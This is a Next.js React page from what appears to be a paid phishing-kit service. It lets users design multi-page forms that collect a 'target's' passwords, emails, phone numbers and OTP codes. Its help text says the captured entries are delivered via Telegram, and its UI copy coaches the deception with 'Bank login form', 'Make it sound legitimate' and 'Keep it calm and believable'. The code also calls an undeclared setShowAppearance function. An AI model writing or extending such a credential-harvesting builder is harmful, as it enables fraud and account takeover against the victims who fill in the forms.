'use client';

import { useState, useEffect } from 'react';
import { toast } from 'react-hot-toast';
import { useRouter } from 'next/navigation';
import {
  PlusIcon,
  TrashIcon,
  ChevronUpIcon,
  ChevronDownIcon,
  DocumentDuplicateIcon,
  EyeIcon,
  CheckCircleIcon,
  XCircleIcon,
  InformationCircleIcon,
  XMarkIcon,
} from '@heroicons/react/24/outline';
import ImageUpload from '@/components/ImageUpload';

type InputType = 'text' | 'email' | 'password' | 'tel' | 'number' | 'otp';

interface PageInput {
  id: string;
  label: string;
  placeholder: string;
  type: InputType;
  required: boolean;
}

interface CustomPage {
  id: string;
  title: string;
  subtitle: string;
  writeup: string;
  logoUrl: string;
  backgroundUrl: string;
  backgroundColor: string;
  textColor: string;
  buttonText: string;
  buttonColor: string;
  buttonTextColor: string;
  inputBackgroundColor: string;
  inputTextColor: string;
  inputs: PageInput[];
}

interface FormData {
  linkName: string;
  pages: CustomPage[];
  successTitle: string;
  successMessage: string;
  successButtonText: string;
  successButtonUrl: string;
  duration: number;
}

const INPUT_TYPES: { value: InputType; label: string; description: string }[] = [
  { value: 'text',     label: 'Text',         description: 'Any text input' },
  { value: 'email',    label: 'Email',         description: 'Email address' },
  { value: 'password', label: 'Password',      description: 'Hidden password field' },
  { value: 'tel',      label: 'Phone',         description: 'Phone number' },
  { value: 'number',   label: 'Number',        description: 'Numbers only' },
  { value: 'otp',      label: 'OTP Code',      description: 'Verification code' },
];

const DURATION_OPTIONS = [
  { value: 0.5, label: '1 Day' },
  { value: 1,   label: '1 Week' },
  { value: 2,   label: '2 Weeks' },
  { value: 4,   label: '1 Month' },
  { value: 8,   label: '2 Months' },
  { value: 12,  label: '3 Months' },
];

const generateId = () => Math.random().toString(36).substring(2, 9);

const createDefaultInput = (): PageInput => ({
  id: generateId(),
  label: '',
  placeholder: '',
  type: 'text',
  required: true,
});

const createDefaultPage = (): CustomPage => ({
  id: generateId(),
  title: '',
  subtitle: '',
  writeup: '',
  logoUrl: '',
  backgroundUrl: '',
  backgroundColor: '#ffffff',
  textColor: '#111827',
  buttonText: 'Continue',
  buttonColor: '#3b82f6',
  buttonTextColor: '#ffffff',
  inputBackgroundColor: 'transparent',
  inputTextColor: '#000000',
  inputs: [],
});

const MAX_PAGES = 5;

/* ── small shared components ── */

function SectionHeader({ children }: { children: React.ReactNode }) {
  return (
    <p className="text-xs font-semibold uppercase tracking-widest text-gray-400 dark:text-gray-500 mb-3">
      {children}
    </p>
  );
}

function HelperText({ children }: { children: React.ReactNode }) {
  return (
    <p className="text-xs text-gray-500 dark:text-gray-400 mt-1 leading-relaxed">{children}</p>
  );
}

function ColorRow({
  label,
  value,
  onChange,
  allowTransparent,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  allowTransparent?: boolean;
}) {
  const isTransparent = value === 'transparent';
  return (
    <div>
      <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">{label}</label>
      <div className="flex gap-2 items-center">
        <input
          type="color"
          disabled={isTransparent}
          value={isTransparent ? '#ffffff' : value}
          onChange={(e) => onChange(e.target.value)}
          className="w-10 h-9 rounded cursor-pointer border border-gray-200 dark:border-gray-700 disabled:opacity-40"
        />
        <input
          type="text"
          disabled={isTransparent}
          value={isTransparent ? '' : value}
          onChange={(e) => onChange(e.target.value)}
          className="flex-1 min-w-0 px-3 py-2 text-xs bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-primary-500/40 disabled:opacity-40"
          placeholder="#hex"
        />
        {allowTransparent && (
          <button
            type="button"
            onClick={() => onChange(isTransparent ? '#ffffff' : 'transparent')}
            className={`shrink-0 px-2.5 py-1.5 rounded-lg text-xs font-medium border transition-colors ${
              isTransparent
                ? 'bg-primary-500 border-primary-500 text-white'
                : 'bg-white dark:bg-gray-800 border-gray-200 dark:border-gray-700 text-gray-600 dark:text-gray-400'
            }`}
          >
            None
          </button>
        )}
      </div>
    </div>
  );
}

export default function CustomGeneratePage() {
  const router = useRouter();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [activePageIndex, setActivePageIndex] = useState(0);
  const [showPreview, setShowPreview] = useState(false);
  const [userPoints, setUserPoints] = useState<number | null>(null);

  const [formData, setFormData] = useState<FormData>({
    linkName: '',
    pages: [createDefaultPage()],
    successTitle: 'Success!',
    successMessage: 'Your submission has been received.',
    successButtonText: 'Done',
    successButtonUrl: '',
    duration: 1,
  });

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => setUserPoints(d.user?.points ?? null))
      .catch(() => {});
  }, []);

  const switchPage = (index: number) => {
    setActivePageIndex(index);
  };

  const activePage = formData.pages[activePageIndex];

  const updatePage = (pageIndex: number, updates: Partial<CustomPage>) => {
    setFormData(prev => ({
      ...prev,
      pages: prev.pages.map((page, i) =>
        i === pageIndex ? { ...page, ...updates } : page
      ),
    }));
  };

  const addPage = () => {
    if (formData.pages.length >= MAX_PAGES) {
      toast.error(`Maximum ${MAX_PAGES} pages allowed`);
      return;
    }
    setFormData(prev => ({ ...prev, pages: [...prev.pages, createDefaultPage()] }));
    setActivePageIndex(formData.pages.length);
    setShowAppearance(false);
  };

  const removePage = (pageIndex: number) => {
    if (formData.pages.length <= 1) {
      toast.error('You need at least one page');
      return;
    }
    setFormData(prev => ({ ...prev, pages: prev.pages.filter((_, i) => i !== pageIndex) }));
    if (activePageIndex >= formData.pages.length - 1) {
      setActivePageIndex(Math.max(0, activePageIndex - 1));
    }
  };

  const movePage = (pageIndex: number, direction: 'up' | 'down') => {
    const newIndex = direction === 'up' ? pageIndex - 1 : pageIndex + 1;
    if (newIndex < 0 || newIndex >= formData.pages.length) return;
    setFormData(prev => {
      const newPages = [...prev.pages];
      [newPages[pageIndex], newPages[newIndex]] = [newPages[newIndex], newPages[pageIndex]];
      return { ...prev, pages: newPages };
    });
    setActivePageIndex(newIndex);
  };

  const duplicatePage = (pageIndex: number) => {
    const pageToDuplicate = formData.pages[pageIndex];
    const duplicatedPage: CustomPage = {
      ...pageToDuplicate,
      id: generateId(),
      inputs: pageToDuplicate.inputs.map(input => ({ ...input, id: generateId() })),
    };
    setFormData(prev => ({
      ...prev,
      pages: [
        ...prev.pages.slice(0, pageIndex + 1),
        duplicatedPage,
        ...prev.pages.slice(pageIndex + 1),
      ],
    }));
    setActivePageIndex(pageIndex + 1);
  };

  const addInput = (pageIndex: number) => {
    updatePage(pageIndex, { inputs: [...formData.pages[pageIndex].inputs, createDefaultInput()] });
  };

  const removeInput = (pageIndex: number, inputIndex: number) => {
    const page = formData.pages[pageIndex];
    updatePage(pageIndex, { inputs: page.inputs.filter((_, i) => i !== inputIndex) });
  };

  const updateInput = (pageIndex: number, inputIndex: number, updates: Partial<PageInput>) => {
    const page = formData.pages[pageIndex];
    updatePage(pageIndex, {
      inputs: page.inputs.map((input, i) => i === inputIndex ? { ...input, ...updates } : input),
    });
  };

  const calculatePrice = () => {
    const basePrice = 4000;
    const includedPages = 5;
    const pagePrice = 1500;
    const effectiveBasePrice = formData.duration === 0.5 ? basePrice / 2 : basePrice;
    const extraPages = Math.max(0, formData.pages.length - includedPages);
    const totalPagePrice = extraPages * pagePrice;
    const durationMultipliers: Record<number, number> = {
      0.5: 1, 1: 1, 2: 2, 4: 4, 8: 7, 12: 10,
    };
    const multiplier = durationMultipliers[formData.duration] || 1;
    return (effectiveBasePrice + totalPagePrice) * multiplier;
  };

  const validateForm = (): boolean => {
    if (!formData.linkName.trim()) {
      toast.error('Link name is required');
      return false;
    }
    for (let i = 0; i < formData.pages.length; i++) {
      const page = formData.pages[i];
      if (!page.title.trim()) {
        toast.error(`Page ${i + 1}: Title is required`);
        switchPage(i);
        return false;
      }
      if (!page.buttonText.trim()) {
        toast.error(`Page ${i + 1}: Button text is required`);
        switchPage(i);
        return false;
      }
      for (let j = 0; j < page.inputs.length; j++) {
        const input = page.inputs[j];
        if (!input.label.trim()) {
          toast.error(`Page ${i + 1}, Input ${j + 1}: Label is required`);
          switchPage(i);
          return false;
        }
      }
    }
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm() || isSubmitting) return;
    setIsSubmitting(true);
    try {
      const response = await fetch('/api/auth/links/generate-custom', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });
      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to generate link');
      }
      toast.success('Custom link generated successfully!');
      router.push('/links');
    } catch (error) {
      console.error('Error submitting form:', error);
      toast.error(error instanceof Error ? error.message : 'Failed to generate link');
      setIsSubmitting(false);
    }
  };

  const price = calculatePrice();
  const canAfford = userPoints === null ? true : userPoints >= price;

  const inputCls = 'w-full px-3.5 py-2.5 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg text-sm text-gray-900 dark:text-white placeholder:text-gray-400 dark:placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-primary-500/40 focus:border-primary-500 transition-all duration-150';

  const pillCls = (active: boolean) =>
    `px-4 py-2 rounded-full text-sm font-semibold transition-colors duration-150 ${
      active
        ? 'bg-primary-500 text-white'
        : 'bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700'
    }`;

  return (
    <div className="max-w-2xl mx-auto px-4 py-6 space-y-8">

      {/* Header */}
      <div className="flex items-start justify-between gap-3">
        <div>
          <h1 className="text-xl font-bold text-gray-900 dark:text-white">Build from Scratch</h1>
          <p className="text-xs text-gray-500 dark:text-gray-400 mt-0.5">
            Design a multi-page form that your target fills out step by step.
          </p>
        </div>
        <button
          type="button"
          onClick={() => setShowPreview(!showPreview)}
          className="shrink-0 flex items-center gap-1.5 px-3 py-2 bg-gray-100 dark:bg-gray-800 text-gray-700 dark:text-gray-300 text-sm font-medium rounded-xl hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors"
        >
          <EyeIcon className="w-4 h-4" />
          Preview
        </button>
      </div>

      {/* How it works */}
      <div className="bg-blue-50 dark:bg-blue-500/10 border border-blue-200 dark:border-blue-500/20 rounded-xl p-4">
        <div className="flex gap-2.5">
          <InformationCircleIcon className="w-4 h-4 text-blue-500 shrink-0 mt-0.5" />
          <div>
            <p className="text-xs font-semibold text-blue-700 dark:text-blue-300 mb-1.5">How this works</p>
            <ol className="space-y-1">
              {[
                'Your target opens the link and sees Page 1 — a form you designed.',
                'After they submit, they move to Page 2, and so on.',
                'Once all pages are done, they see a final success message.',
                'You receive everything they entered via Telegram.',
              ].map((step, i) => (
                <li key={i} className="flex items-start gap-2 text-xs text-blue-700 dark:text-blue-300">
                  <span className="shrink-0 w-4 h-4 rounded-full bg-blue-200 dark:bg-blue-500/30 text-blue-700 dark:text-blue-300 font-bold flex items-center justify-center text-[10px]">
                    {i + 1}
                  </span>
                  {step}
                </li>
              ))}
            </ol>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-8">

        {/* ── Section 1: Reference name ── */}
        <section>
          <SectionHeader>1 — Your reference name</SectionHeader>
          <input
            type="text"
            value={formData.linkName}
            onChange={(e) => setFormData({ ...formData, linkName: e.target.value })}
            className={inputCls}
            placeholder="e.g. Bank login form"
            maxLength={50}
          />
          <HelperText>Only you see this — used to find the link in your dashboard.</HelperText>
        </section>

        {/* ── Section 2: Pages ── */}
        <section className="space-y-4">
          <div className="flex items-center justify-between">
            <SectionHeader>2 — Pages ({formData.pages.length}/{MAX_PAGES})</SectionHeader>
            <button
              type="button"
              onClick={addPage}
              disabled={formData.pages.length >= MAX_PAGES}
              className="flex items-center gap-1.5 px-3 py-1.5 bg-primary-500 hover:bg-primary-600 text-white text-xs font-semibold rounded-lg transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
            >
              <PlusIcon className="w-3.5 h-3.5" />
              Add Page
            </button>
          </div>

          <p className="text-xs text-gray-500 dark:text-gray-400 -mt-2">
            Each page is a separate screen your target sees. Most use cases only need 1–2 pages.
          </p>

          {/* Page tabs */}
          <div className="flex flex-wrap gap-2">
            {formData.pages.map((page, index) => (
              <button
                key={page.id}
                type="button"
                onClick={() => switchPage(index)}
                className={`px-4 py-2 rounded-lg text-sm font-semibold transition-colors ${
                  activePageIndex === index
                    ? 'bg-primary-500 text-white'
                    : 'bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700'
                }`}
              >
                {page.title.trim() ? page.title.slice(0, 18) + (page.title.length > 18 ? '…' : '') : `Page ${index + 1}`}
              </button>
            ))}
          </div>

          {/* Active page editor */}
          {activePage && (
            <div className="border border-gray-200 dark:border-gray-700 rounded-xl overflow-hidden">

              {/* Page toolbar */}
              <div className="flex items-center gap-1.5 px-3 py-2.5 bg-gray-50 dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700">
                <span className="text-xs font-medium text-gray-500 dark:text-gray-400 mr-auto">
                  Page {activePageIndex + 1} of {formData.pages.length}
                </span>
                <button
                  type="button"
                  onClick={() => movePage(activePageIndex, 'up')}
                  disabled={activePageIndex === 0}
                  title="Move earlier"
                  className="p-1.5 rounded-lg text-gray-500 hover:bg-gray-200 dark:hover:bg-gray-700 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                >
                  <ChevronUpIcon className="w-4 h-4" />
                </button>
                <button
                  type="button"
                  onClick={() => movePage(activePageIndex, 'down')}
                  disabled={activePageIndex === formData.pages.length - 1}
                  title="Move later"
                  className="p-1.5 rounded-lg text-gray-500 hover:bg-gray-200 dark:hover:bg-gray-700 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                >
                  <ChevronDownIcon className="w-4 h-4" />
                </button>
                <button
                  type="button"
                  onClick={() => duplicatePage(activePageIndex)}
                  title="Duplicate"
                  className="p-1.5 rounded-lg text-gray-500 hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors"
                >
                  <DocumentDuplicateIcon className="w-4 h-4" />
                </button>
                <button
                  type="button"
                  onClick={() => removePage(activePageIndex)}
                  disabled={formData.pages.length <= 1}
                  title="Delete page"
                  className="p-1.5 rounded-lg text-red-400 hover:bg-red-50 dark:hover:bg-red-500/10 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                >
                  <TrashIcon className="w-4 h-4" />
                </button>
              </div>

              <div className="p-4 space-y-4 bg-white dark:bg-gray-900">

                {/* Title + subtitle */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Page title <span className="text-red-400">*</span>
                    </label>
                    <input
                      type="text"
                      value={activePage.title}
                      onChange={(e) => updatePage(activePageIndex, { title: e.target.value })}
                      className={inputCls}
                      placeholder="e.g. Login to continue"
                    />
                    <HelperText>Shown as the main heading on this page.</HelperText>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                      Subtitle <span className="text-gray-400 font-normal text-xs">(optional)</span>
                    </label>
                    <input
                      type="text"
                      value={activePage.subtitle}
                      onChange={(e) => updatePage(activePageIndex, { subtitle: e.target.value })}
                      className={inputCls}
                      placeholder="e.g. Enter your credentials"
                    />
                    <HelperText>Shown just below the title in smaller text.</HelperText>
                  </div>
                </div>

                {/* Description */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Description <span className="text-gray-400 font-normal text-xs">(optional)</span>
                  </label>
                  <textarea
                    value={activePage.writeup}
                    onChange={(e) => updatePage(activePageIndex, { writeup: e.target.value })}
                    className={inputCls}
                    rows={2}
                    placeholder="Additional context shown above the form fields. Make it sound legitimate."
                  />
                  <HelperText>Supporting text shown above the input fields.</HelperText>
                </div>

                {/* Images */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <ImageUpload
                    label="Logo (optional)"
                    value={activePage.logoUrl}
                    onChange={(url) => updatePage(activePageIndex, { logoUrl: url })}
                    hint="Small brand image shown at the top of the page."
                  />
                  <ImageUpload
                    label="Background image (optional)"
                    value={activePage.backgroundUrl}
                    onChange={(url) => updatePage(activePageIndex, { backgroundUrl: url })}
                    hint="Full-page background image."
                  />
                </div>

                {/* Button text */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                    Button text <span className="text-red-400">*</span>
                  </label>
                  <input
                    type="text"
                    value={activePage.buttonText}
                    onChange={(e) => updatePage(activePageIndex, { buttonText: e.target.value })}
                    className={inputCls}
                    placeholder="e.g. Continue, Submit, Next"
                  />
                  <HelperText>The label on the submit button at the bottom of this page.</HelperText>
                </div>

                {/* ── Input fields ── */}
                <div className="border-t border-gray-100 dark:border-gray-800 pt-4">
                  <div className="flex items-center justify-between mb-3">
                    <div>
                      <p className="text-sm font-semibold text-gray-800 dark:text-white">Input fields</p>
                      <p className="text-xs text-gray-500 dark:text-gray-400">What you want the target to type in.</p>
                    </div>
                    <button
                      type="button"
                      onClick={() => addInput(activePageIndex)}
                      className="flex items-center gap-1.5 px-3 py-1.5 bg-gray-100 dark:bg-gray-800 text-gray-700 dark:text-gray-300 text-xs font-semibold rounded-lg hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors"
                    >
                      <PlusIcon className="w-3.5 h-3.5" />
                      Add field
                    </button>
                  </div>

                  {activePage.inputs.length === 0 && (
                    <div className="text-center py-6 border border-dashed border-gray-200 dark:border-gray-700 rounded-xl">
                      <p className="text-sm text-gray-500 dark:text-gray-400">No fields yet.</p>
                      <p className="text-xs text-gray-400 dark:text-gray-500 mt-1">Click "Add field" to add a password box, email field, etc.</p>
                    </div>
                  )}

                  <div className="space-y-3">
                    {activePage.inputs.map((input, inputIndex) => (
                      <div key={input.id} className="bg-gray-50 dark:bg-gray-800 rounded-xl p-3.5 space-y-3">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-semibold text-gray-500 dark:text-gray-400 uppercase tracking-wide">
                            Field {inputIndex + 1}
                          </span>
                          <button
                            type="button"
                            onClick={() => removeInput(activePageIndex, inputIndex)}
                            className="p-1 text-red-400 hover:text-red-500 transition-colors"
                          >
                            <TrashIcon className="w-4 h-4" />
                          </button>
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                          <div>
                            <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">
                              Label <span className="text-red-400">*</span>
                            </label>
                            <input
                              type="text"
                              value={input.label}
                              onChange={(e) => updateInput(activePageIndex, inputIndex, { label: e.target.value })}
                              className={inputCls}
                              placeholder="e.g. Password"
                            />
                          </div>
                          <div>
                            <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">
                              Placeholder hint
                            </label>
                            <input
                              type="text"
                              value={input.placeholder}
                              onChange={(e) => updateInput(activePageIndex, inputIndex, { placeholder: e.target.value })}
                              className={inputCls}
                              placeholder="e.g. Enter your password"
                            />
                          </div>
                        </div>

                        {/* Input type picker */}
                        <div>
                          <label className="block text-xs font-medium text-gray-600 dark:text-gray-400 mb-1.5">
                            Field type
                          </label>
                          <div className="flex flex-wrap gap-1.5">
                            {INPUT_TYPES.map((t) => (
                              <button
                                key={t.value}
                                type="button"
                                onClick={() => updateInput(activePageIndex, inputIndex, { type: t.value })}
                                title={t.description}
                                className={`px-2.5 py-1 rounded-lg text-xs font-semibold transition-colors ${
                                  input.type === t.value
                                    ? 'bg-primary-500 text-white'
                                    : 'bg-white dark:bg-gray-700 border border-gray-200 dark:border-gray-600 text-gray-600 dark:text-gray-400 hover:border-primary-400'
                                }`}
                              >
                                {t.label}
                              </button>
                            ))}
                          </div>
                          <HelperText>
                            {INPUT_TYPES.find(t => t.value === input.type)?.description}.
                            {input.type === 'password' && ' The typed characters will be hidden with dots.'}
                            {input.type === 'otp' && ' Shows a code verification input — use this for OTP pages.'}
                          </HelperText>
                        </div>

                        {/* Required toggle */}
                        <label className="flex items-center gap-2 cursor-pointer w-fit">
                          <input
                            type="checkbox"
                            checked={input.required}
                            onChange={(e) => updateInput(activePageIndex, inputIndex, { required: e.target.checked })}
                            className="w-4 h-4 rounded border-gray-300 text-primary-500 focus:ring-primary-500"
                          />
                          <span className="text-xs font-medium text-gray-600 dark:text-gray-400">Required field</span>
                        </label>
                      </div>
                    ))}
                  </div>
                </div>

                {/* ── Appearance ── */}
                <div className="border-t border-gray-100 dark:border-gray-800 pt-4">
                  <p className="text-sm font-semibold text-gray-700 dark:text-gray-300 mb-1">Customise appearance</p>
                  <p className="text-xs text-gray-500 dark:text-gray-400 mb-3">Colours for background, text, and buttons on this page.</p>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <ColorRow
                      label="Background colour"
                      value={activePage.backgroundColor}
                      onChange={(v) => updatePage(activePageIndex, { backgroundColor: v })}
                      allowTransparent
                    />
                    <ColorRow
                      label="Text colour"
                      value={activePage.textColor}
                      onChange={(v) => updatePage(activePageIndex, { textColor: v })}
                    />
                    <ColorRow
                      label="Button colour"
                      value={activePage.buttonColor}
                      onChange={(v) => updatePage(activePageIndex, { buttonColor: v })}
                    />
                    <ColorRow
                      label="Button text colour"
                      value={activePage.buttonTextColor}
                      onChange={(v) => updatePage(activePageIndex, { buttonTextColor: v })}
                    />
                    <ColorRow
                      label="Input background colour"
                      value={activePage.inputBackgroundColor}
                      onChange={(v) => updatePage(activePageIndex, { inputBackgroundColor: v })}
                      allowTransparent
                    />
                    <ColorRow
                      label="Input text colour"
                      value={activePage.inputTextColor}
                      onChange={(v) => updatePage(activePageIndex, { inputTextColor: v })}
                    />
                  </div>
                </div>
              </div>
            </div>
          )}
        </section>

        {/* ── Section 3: Success page ── */}
        <section className="space-y-4">
          <SectionHeader>3 — What happens after the last page?</SectionHeader>
          <p className="text-xs text-gray-500 dark:text-gray-400 -mt-2">
            After your target fills out all pages, they see this final screen.
          </p>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                Heading
              </label>
              <input
                type="text"
                value={formData.successTitle}
                onChange={(e) => setFormData({ ...formData, successTitle: e.target.value })}
                className={inputCls}
                placeholder="Success!"
              />
              <HelperText>The big text they see after completing all pages.</HelperText>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                Button text
              </label>
              <input
                type="text"
                value={formData.successButtonText}
                onChange={(e) => setFormData({ ...formData, successButtonText: e.target.value })}
                className={inputCls}
                placeholder="Done"
              />
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Message
            </label>
            <textarea
              value={formData.successMessage}
              onChange={(e) => setFormData({ ...formData, successMessage: e.target.value })}
              className={inputCls}
              rows={2}
              placeholder="Your submission has been received."
            />
            <HelperText>Shown below the heading. Keep it calm and believable.</HelperText>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Redirect URL <span className="text-gray-400 font-normal text-xs">(optional)</span>
            </label>
            <input
              type="text"
              value={formData.successButtonUrl}
              onChange={(e) => setFormData({ ...formData, successButtonUrl: e.target.value })}
              className={inputCls}
              placeholder="https://example.com"
            />
            <HelperText>
              If set, the button on the success screen sends the target to this URL. Leave empty to keep them on the success page.
            </HelperText>
          </div>
        </section>

        {/* ── Section 4: Duration & cost ── */}
        <section className="space-y-4">
          <SectionHeader>4 — Duration &amp; cost</SectionHeader>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              How long should the link stay active?
            </label>
            <div className="flex flex-wrap gap-2 mt-2">
              {DURATION_OPTIONS.map((option) => (
                <button
                  key={option.value}
                  type="button"
                  onClick={() => setFormData(prev => ({ ...prev, duration: option.value }))}
                  className={pillCls(formData.duration === option.value)}
                >
                  {option.label}
                </button>
              ))}
            </div>
          </div>

          {/* Cost summary card */}
          <div className="rounded-xl border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 overflow-hidden">
            <div className="px-4 py-3 border-b border-gray-100 dark:border-gray-700">
              <p className="text-xs font-semibold uppercase tracking-widest text-gray-400 dark:text-gray-500">
                Cost summary
              </p>
            </div>
            <div className="px-4 py-3 space-y-2">
              <div className="flex justify-between text-sm text-gray-600 dark:text-gray-400">
                <span>Base ({formData.duration === 0.5 ? '1-day rate' : '1-week rate'})</span>
                <span>₦{(formData.duration === 0.5 ? 2000 : 4000).toLocaleString()}</span>
              </div>
              {formData.pages.length > 5 && (
                <div className="flex justify-between text-sm text-gray-600 dark:text-gray-400">
                  <span>Extra pages (×{formData.pages.length - 5})</span>
                  <span>+₦{((formData.pages.length - 5) * 1500).toLocaleString()}</span>
                </div>
              )}
              {(() => {
                const durationMultipliers: Record<number, number> = {
                  0.5: 1, 1: 1, 2: 2, 4: 4, 8: 7, 12: 10,
                };
                const mult = durationMultipliers[formData.duration] ?? 1;
                return mult > 1 ? (
                  <div className="flex justify-between text-sm text-gray-600 dark:text-gray-400">
                    <span>Duration multiplier</span>
                    <span>×{mult}</span>
                  </div>
                ) : null;
              })()}
              <div className="border-t border-gray-100 dark:border-gray-700 pt-2 flex justify-between">
                <span className="text-sm font-semibold text-gray-900 dark:text-white">Total</span>
                <span className="text-base font-bold text-primary-500">₦{price.toLocaleString()}</span>
              </div>
              {userPoints !== null && (
                <div className="flex justify-between text-sm">
                  <span className="text-gray-500 dark:text-gray-400">Your balance</span>
                  <span className={`font-medium ${canAfford ? 'text-gray-700 dark:text-gray-300' : 'text-red-500'}`}>
                    ₦{userPoints.toLocaleString()}
                  </span>
                </div>
              )}
            </div>
            {userPoints !== null && (
              <div className={`px-4 py-2.5 flex items-center gap-2 ${canAfford ? 'bg-green-50 dark:bg-green-500/10' : 'bg-red-50 dark:bg-red-500/10'}`}>
                {canAfford ? (
                  <>
                    <CheckCircleIcon className="w-4 h-4 text-green-500 shrink-0" />
                    <span className="text-xs font-medium text-green-700 dark:text-green-400">You can afford this</span>
                  </>
                ) : (
                  <>
                    <XCircleIcon className="w-4 h-4 text-red-500 shrink-0" />
                    <span className="text-xs font-medium text-red-600 dark:text-red-400">
                      Insufficient balance — top up ₦{(price - userPoints).toLocaleString()} more to proceed.
                    </span>
                  </>
                )}
              </div>
            )}
          </div>
        </section>

        {/* ── Submit ── */}
        <button
          type="submit"
          disabled={isSubmitting || !canAfford}
          className="w-full py-3 px-4 rounded-xl font-semibold text-white bg-primary-500 hover:bg-primary-600 transition-colors duration-150 disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-2"
        >
          {isSubmitting ? (
            <>
              <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
              </svg>
              Generating…
            </>
          ) : (
            'Generate Link'
          )}
        </button>
      </form>

      {/* ── Preview modal ── */}
      {showPreview && activePage && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70">
          <div className="relative w-full max-w-sm">
            <div className="flex items-center justify-between mb-3">
              <span className="text-white text-sm font-medium">
                Preview — {activePage.title || `Page ${activePageIndex + 1}`}
              </span>
              <button
                onClick={() => setShowPreview(false)}
                className="text-white hover:text-gray-300 transition-colors"
              >
                <XMarkIcon className="w-5 h-5" />
              </button>
            </div>
            <div
              className="relative rounded-2xl overflow-hidden shadow-2xl"
              style={{
                backgroundColor: activePage.backgroundColor === 'transparent' ? '#ffffff' : activePage.backgroundColor,
              }}
            >
              {activePage.backgroundUrl && (
                <div
                  className="absolute inset-0 bg-cover bg-center opacity-20"
                  style={{ backgroundImage: `url(${activePage.backgroundUrl})` }}
                />
              )}
              <div className="relative p-6">
                {activePage.logoUrl && (
                  // eslint-disable-next-line @next/next/no-img-element
                  <img
                    src={activePage.logoUrl}
                    alt="Logo"
                    className="h-10 mx-auto mb-5 object-contain"
                    onError={(e) => { e.currentTarget.style.display = 'none'; }}
                  />
                )}
                <h2 className="text-lg font-bold text-center mb-1" style={{ color: activePage.textColor }}>
                  {activePage.title || 'Page Title'}
                </h2>
                {activePage.subtitle && (
                  <p className="text-sm text-center mb-3" style={{ color: activePage.textColor, opacity: 0.7 }}>
                    {activePage.subtitle}
                  </p>
                )}
                {activePage.writeup && (
                  <p className="text-xs mb-4" style={{ color: activePage.textColor, opacity: 0.7 }}>
                    {activePage.writeup}
                  </p>
                )}
                <div className="space-y-3">
                  {activePage.inputs.map((input) => (
                    <div key={input.id}>
                      <label className="block text-xs font-medium mb-1" style={{ color: activePage.textColor }}>
                        {input.label || 'Field label'}
                        {input.required && <span className="text-red-500 ml-1">*</span>}
                      </label>
                      <input
                        type={input.type === 'otp' ? 'text' : input.type}
                        placeholder={input.placeholder}
                        className="w-full px-3 py-2.5 rounded-lg text-sm"
                        style={{
                          backgroundColor: activePage.inputBackgroundColor === 'transparent' ? 'transparent' : activePage.inputBackgroundColor,
                          color: activePage.inputTextColor,
                          border: '1px solid #d1d5db',
                        }}
                        disabled
                      />
                    </div>
                  ))}
                </div>
                <button
                  className="w-full mt-5 py-2.5 rounded-lg text-sm font-semibold"
                  style={{ backgroundColor: activePage.buttonColor, color: activePage.buttonTextColor }}
                  disabled
                >
                  {activePage.buttonText || 'Continue'}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
